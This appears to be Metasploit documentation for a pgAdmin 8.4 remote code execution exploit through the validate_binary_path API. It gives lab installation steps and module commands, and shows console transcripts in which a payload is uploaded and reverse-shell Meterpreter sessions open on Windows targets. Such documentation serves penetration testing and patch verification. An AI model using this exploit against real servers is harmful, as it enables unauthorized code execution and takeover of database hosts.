## Vulnerable Application
The pgAdmin versions up to 8.4 are vulnerable to a Remote Code Execution (RCE) flaw through the validate binary path API.
This vulnerability allows attackers to run arbitrary code on the server hosting pgAdmin, which poses a significant
threat to the integrity of the database management system and the security of its underlying data.

The exploit can be executed in both authenticated and unauthenticated scenarios. When valid credentials are available,
Metasploit can log in to pgAdmin, upload a malicious payload using the file management plugin, and then execute it via
the validate_binary_path endpoint. This vulnerability is specific to Windows targets. If authentication is not required
by the application, Metasploit can directly upload and trigger the payload through the validate_binary_path endpoint.

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/pgadmin_binary_path_api`
1. Set the `RHOST`, `PAYLOAD`, and optionally the `USERNAME` and `PASSWORD` options
1. Do: `run`


### Installation (Windows)

These steps are the bare minimum to get the application to run for testing and should not be use for a production setup.
For a production setup, a server like Apache should be setup to run pgAdmin through it's WSGI interface.

**The following paths are all relative to the default installation path `C:\Program Files\pgAdmin 4\web`**.

1. [Download][1] and install the Windows build
1. Copy the `config_distro.py` file to `config_local.py`
1. Edit `config_local.py` and set `SERVER_MODE` to `True`
1. Edit `config_local.py` and add `DEFAULT_SERVER = '0.0.0.0'` to bind on all IPs, required for remotely exploiting from a different machine
1. Initialize the database: `..\python\python.exe setup.py setup-db`
1. Create an initial user account: `..\python\python.exe setup.py add-user --admin test@test.com 123456`
1. Run the application: `..\python\python.exe pgAdmin4.py`

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### pgAdmin 8.4 on Windows (Authenticated)

```
msf6 exploit(windows/http/pgadmin_binary_path_api) > set RHOSTS 192.168.1.5
RHOSTS => 192.168.1.5
msf6 exploit(windows/http/pgadmin_binary_path_api) > set USERNAME test@test.com
USERNAME => test@test.com
msf6 exploit(windows/http/pgadmin_binary_path_api) > set PASSWORD 123456
PASSWORD => 123456
msf6 exploit(windows/http/pgadmin_binary_path_api) > set LHOST 192.168.1.6 
LHOST => 192.168.1.6
msf6 exploit(windows/http/pgadmin_binary_path_api) > exploit 

[*] Started reverse TCP handler on 192.168.1.6:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. pgAdmin version 8.4.0 is affected
[*] Successfully authenticated to pgAdmin
[*] Payload uploaded to: C:\Users\pgAdmin\Desktop\CVE-2024-3116\pgadmin4\storage\test_test.com/pg_restore.exe
[*] Sending stage (201798 bytes) to 192.168.1.5
[*] Meterpreter session 1 opened (192.168.1.6:4444 -> 192.168.1.5:52588) at 2024-08-26 19:48:10 +0200
[!] This exploit may require manual cleanup of 'C:\Users\pgAdmin\Desktop\CVE-2024-3116\pgadmin4\storage\test_test.com/pg_restore.exe' on the target

meterpreter > sysinfo
Computer        : DESKTOP-FMNV75N
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 

```

### pgAdmin 8.4 on Windows (Unauthenticated)

```
msf6 exploit(windows/http/pgadmin_binary_path_api) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 exploit(windows/http/pgadmin_binary_path_api) > set LHOST 192.168.1.6 
LHOST => 192.168.1.6
msf6 exploit(windows/http/pgadmin_binary_path_api) > exploit 

[*] Started reverse TCP handler on 192.168.1.6:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. pgAdmin version 8.4.0 is affected
[*] Payload uploaded to: C:\Users\pgAdmin\pg_restore.exe
[*] Sending stage (200774 bytes) to 192.168.1.7
[*] Meterpreter session 1 opened (192.168.1.6:4444 -> 192.168.1.7:55560) at 2024-08-26 19:51:01 +0200
[!] This exploit may require manual cleanup of 'C:\Users\pgAdmin\pg_restore.exe' on the target

meterpreter > sysinfo
Computer        : DESKTOP-HTGS43E
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 

```
